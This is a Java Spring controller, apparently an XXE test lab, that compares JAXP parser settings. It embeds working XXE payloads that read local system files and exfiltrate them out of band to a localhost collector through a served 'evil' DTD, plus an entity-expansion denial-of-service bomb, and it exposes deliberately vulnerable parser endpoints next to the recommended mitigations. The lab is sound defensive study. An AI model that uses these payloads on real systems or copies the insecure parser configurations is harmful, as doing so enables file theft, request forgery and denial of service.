package cn.moonlord.test;

import io.swagger.annotations.*;
import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import springfox.documentation.annotations.ApiIgnore;

import javax.servlet.http.HttpServletRequest;
import javax.xml.XMLConstants;
import javax.xml.parsers.*;
import javax.xml.transform.*;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.*;

@Api(tags = "XXE 测试")
@RestController
@RequestMapping("/XXE")
public class XXETestController {

    private static final String testCaseA =
            "<!DOCTYPE example [" + "\r\n" +
                    "<!ENTITY file \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                    "<!ENTITY xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                    "<!ENTITY http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                    "<!ENTITY xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                    "<!ENTITY send \"http://localhost:8080/XXE/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/XXE/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
            "]>" + "\r\n" +
            "<example>" + "\r\n" +
                    "<file>&file;</file>" + "\r\n" +
                    "<xxe1>&xxe1;</xxe1>" + "\r\n" +
                    "<http>&http;</http>" + "\r\n" +
                    "<xxe2>&xxe2;</xxe2>" + "\r\n" +
                    "<send>&send;</send>" + "\r\n" +
                    "<xxe3>&xxe3;</xxe3>" + "\r\n" +
            "</example>";

    private static final String testCaseB1 =
            "<!DOCTYPE param [" + "\r\n" +
                    "<!ENTITY % file1 \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                    "<!ENTITY % send0 SYSTEM \"http://localhost:8080/XXE/sendDataEntity?data=%file1;%file2;\" >" + "\r\n" +
                    "<!ENTITY % file2 \"file:///C:/Windows/System32/drivers/etc/hosts\" >" + "\r\n" +
                    "%send0;" + "\r\n" +
            "]>" + "\r\n" +
            "<param>" + "\r\n" +
            "</param>";

    private static final String evilDTD =
            "<!ENTITY % file \"file:///C:/Windows/win.ini\" >" + "\r\n" +
            "<!ENTITY % xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
            "<!ENTITY % http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
            "<!ENTITY % xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
            "<!ENTITY % send1 SYSTEM \"http://localhost:8080/XXE/sendDataEntity?data=%file;\" >" + "\r\n" +
            "<!ENTITY % fake \"" + "\r\n" +
                    "<!ENTITY &#37; send2 SYSTEM 'http://localhost:8080/XXE/sendDataEntity?data=%file;' >" + "\r\n" +
                    "<!ENTITY &#37; send3 SYSTEM 'http://localhost:8080/XXE/sendDataEntity?data=%xxe1;' >" + "\r\n" +
                    "<!ENTITY &#37; send4 SYSTEM 'http://localhost:8080/XXE/sendDataEntity?data=%xxe2;' >" + "\r\n" +
            "\" >";

    private static final String testCaseB2 =
            "<!DOCTYPE param [" + "\r\n" +
                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                    "%dtd; %send1;" + "\r\n" +
            "]>" + "\r\n" +
            "<param>" + "\r\n" +
            "</param>";

    private static final String testCaseB3 =
            "<!DOCTYPE param [" + "\r\n" +
                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                    "%dtd; %fake; %send2;" + "\r\n" +
            "]>" + "\r\n" +
            "<param>" + "\r\n" +
            "</param>";

    private static final String testCaseB4 =
            "<!DOCTYPE param [" + "\r\n" +
                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                    "%dtd; %fake; %send3;" + "\r\n" +
            "]>" + "\r\n" +
            "<param>" + "\r\n" +
            "</param>";

    private static final String testCaseB5 =
            "<!DOCTYPE param [" + "\r\n" +
                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                    "%dtd; %fake; %send4;" + "\r\n" +
                    " ]>" + "\r\n" +
            "<param>" + "\r\n" +
            "</param>";

    private static final String testCaseC =
            "<!DOCTYPE recursion [" + "\r\n" +
                    "<!ENTITY a \"This is a simple element.\r\n\" >" + "\r\n" +
                    "<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\" >" + "\r\n" +
                    "<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\" >" + "\r\n" +
                    "<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\" >" + "\r\n" +
                    "<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\" >" + "\r\n" +
                    "<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\" >" + "\r\n" +
                    "<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >" + "\r\n" +
                    "<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >" + "\r\n" +
                    "<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >" + "\r\n" +
            "]>" + "\r\n" +
            "<recursion>" + "\r\n" +
                    "<a>&a;</a>" + "\r\n" +
                    "<b>&b;</b>" + "\r\n" +
                    "<c>&b;</c>" + "\r\n" +
                    "<d>&d;</d>" + "\r\n" +
                    "<e>&e;</e>" + "\r\n" +
                    "<f>&f;</f>" + "\r\n" +
                    "<g>&g;</g>" + "\r\n" +
                    "<h>&h;</h>" + "\r\n" +
                    "<i>&i;</i>" + "\r\n" +
            "</recursion>";

    private static DocumentBuilderFactory initJAXP() throws Exception {
        System.setProperty(
                "javax.xml.parsers.DocumentBuilderFactory",
                "com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl"
        );
        System.setProperty(
                "javax.xml.transform.TransformerFactory",
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl"
        );
        DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
        System.out.println("documentBuilderFactory: " + documentBuilderFactory.getClass().getName());
        return documentBuilderFactory;
    }

    private static String outputXML(DocumentBuilderFactory documentBuilderFactory, String inputXML) throws Exception {
        DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
        System.out.println("documentBuilder: " + documentBuilder.getClass().getName());
        Document document = documentBuilder.parse(new ByteArrayInputStream(inputXML.getBytes()));
        System.out.println("document: " + document.getClass().getName());
        StringWriter stringWriter = new StringWriter();
        TransformerFactory transformerFactory = TransformerFactory.newInstance();
        System.out.println("transformerFactory: " + transformerFactory.getClass().getName());
        Transformer transformer = transformerFactory.newTransformer();
        System.out.println("transformer: " + transformer.getClass().getName());
        transformer.setOutputProperty(OutputKeys.INDENT, "yes");
        transformer.transform(new DOMSource(document), new StreamResult(stringWriter));
        String result = stringWriter.getBuffer().toString();
        System.out.println("result: " + "\r\n" + result);
        return "输入用例 [" + inputXML.length() + "]：" + "\r\n" + inputXML + "\r\n" + "解析结果 [" + result.length() + "]：" + "\r\n" + result;
    }

    @ApiIgnore
    @GetMapping(value = "/sendDataElement")
    public String sendDataElement(@RequestParam(defaultValue = "") String data, HttpServletRequest request) {
        data =
                "<![CDATA[" + "\r\n" +
                        "URL: " + request.getRequestURL() + "?" + request.getQueryString() + "\r\n" +
                        "data length: " + data.length() + "\r\n" +
                        data + "\r\n" +
                "]]>"
        ;
        System.err.println(data);
        return data;
    }

    @ApiIgnore
    @GetMapping(value = "/sendDataEntity")
    public String sendDataEntity(@RequestParam(defaultValue = "") String data, HttpServletRequest request) {
        data =
                "<!ENTITY sendDataEntity \"" + "\r\n" +
                        "URL: " + request.getRequestURL() + "?" + request.getQueryString() + "\r\n" +
                        "data length: " + data.length() + "\r\n" +
                        data + "\r\n" +
                "\" >"
        ;
        System.err.println(data);
        return data;
    }

    @ApiIgnore
    @GetMapping(value = "/evilDTD")
    public String evilDTD(HttpServletRequest request) {
        System.err.println("URL: " + request.getRequestURL());
        return evilDTD;
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A1，使用默认的设置解析 XML，存在 XXE 漏洞，可回显文件內容，可发送 Http 请求")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseA))
    @GetMapping(value = "/JAXPTestA1")
    public String JAXPTestA1(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A2，关闭 XMLConstants.FEATURE_SECURE_PROCESSING 的限制，无效果")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseA))
    @GetMapping(value = "/JAXPTestA2")
    public String JAXPTestA2(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A3，关闭实体引用扩展 setExpandEntityReferences(false)，不可回显，但是实体仍会被解析，http 请求仍会发送")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseA))
    @GetMapping(value = "/JAXPTestA3")
    public String JAXPTestA3(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setExpandEntityReferences(false);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A4，禁用外部实体和 DTD 引用，可防御 XXE 攻击（推荐方法）")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseA))
    @GetMapping(value = "/JAXPTestA4")
    public String JAXPTestA4(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        documentBuilderFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        documentBuilderFactory.setValidating(false);
        documentBuilderFactory.setXIncludeAware(false);
        documentBuilderFactory.setNamespaceAware(false);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A5，禁用 DTD 声明，直接报错，可防御 XXE 攻击")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseA))
    @GetMapping(value = "/JAXPTestA5")
    public String JAXPTestA5(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 B1，直接发送 http 请求，http 参数中的实体不会解析")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseB1))
    @GetMapping(value = "/JAXPTestB1")
    public String JAXPTestB1(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 B2，引用外部的 DTD 文件，在 DTD 中发送 http 请求，http 参数中的实体不会解析")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseB2))
    @GetMapping(value = "/JAXPTestB2")
    public String JAXPTestB2(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 B3，引用外部的 DTD 文件，在 DTD 中嵌套实体， 再发送 http 请求，http 参数中的实体正确解析")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseB3))
    @GetMapping(value = "/JAXPTestB3")
    public String JAXPTestB3(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 B4，在测试用例 B3 的基础上，发送多行的文件内容，会因为 URL 格式不正确报错，请求不会发送")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseB4))
    @GetMapping(value = "/JAXPTestB4")
    public String JAXPTestB4(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 B5，在测试用例 B3 的基础上，发送单行的 Json 字符串，请求成功发送")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseB5))
    @GetMapping(value = "/JAXPTestB5")
    public String JAXPTestB5(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C1，默认 XMLConstants.FEATURE_SECURE_PROCESSING 限制打开，最多支持 64000 个实体扩展，超出时会直接报错")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseC))
    @GetMapping(value = "/JAXPTestC1")
    public String JAXPTestC1(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C2，关闭 XMLConstants.FEATURE_SECURE_PROCESSING 的限制，堆内存溢出，导致拒绝服务")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseC))
    @GetMapping(value = "/JAXPTestC2")
    public String JAXPTestC2(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C3，在测试用例 C2 的基础上，关闭实体引用扩展 setExpandEntityReferences(false)，仍会内存溢出")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseC))
    @GetMapping(value = "/JAXPTestC3")
    public String JAXPTestC3(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        documentBuilderFactory.setExpandEntityReferences(false);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C4，在测试用例 C2 的基础上，禁用外部实体和 DTD 引用，仍会内存溢出")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseC))
    @GetMapping(value = "/JAXPTestC4")
    public String JAXPTestC4(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        documentBuilderFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        documentBuilderFactory.setValidating(false);
        documentBuilderFactory.setXIncludeAware(false);
        documentBuilderFactory.setNamespaceAware(false);
        return outputXML(documentBuilderFactory, inputXML);
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C5，在测试用例 C2 的基础上，禁用 DTD 声明，直接报错，内存不会溢出")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCaseC))
    @GetMapping(value = "/JAXPTestC5")
    public String JAXPTestC5(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        return outputXML(documentBuilderFactory, inputXML);
    }

}
